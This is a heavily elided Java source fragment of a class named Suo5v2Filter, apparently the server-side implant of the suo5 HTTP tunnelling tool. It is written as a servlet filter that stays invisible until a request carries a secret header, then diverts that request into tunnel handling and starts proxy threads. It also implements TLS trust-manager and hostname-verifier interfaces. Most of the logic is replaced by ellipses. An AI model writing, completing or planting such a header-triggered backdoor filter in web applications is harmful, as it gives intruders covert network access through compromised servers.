 ...
 * @since 2025/12/9
 */
public class Suo5v2Filter implements Filter, Runnable, HostnameVerifier, X509TrustManager {
    ...
    public Suo5v2Filter(InputStream in, OutputStream out, String tunId) {
        this.gInStream = in;
        this.gOutStream = out;
        this.gtunId = tunId;
    }

    public Suo5v2Filter(String tunId, int mode) {
        this.gtunId = tunId;
        this.mode = mode;
    }
    ...
    public void doFilter(ServletRequest sReq, ServletResponse sResp, FilterChain chain) throws IOException, ServletException {
        ...
        try {
            if (request.getHeader(headerName) != null && request.getHeader(headerName).contains(headerValue)) {
                new Suo5v2Filter().process(request, response);
                return;
            }
...
//
    ...
    private byte[] performCreate(HttpServletRequest request, HashMap dataMap, String tunId, boolean newThread) throws Exception {
        ...
        try {
            ...
            if (newThread) {
                new Thread(new Suo5v2Filter(tunId, 1)).start();
                new Thread(new Suo5v2Filter(tunId, 2)).start();
            }
        } catch (Exception e) {
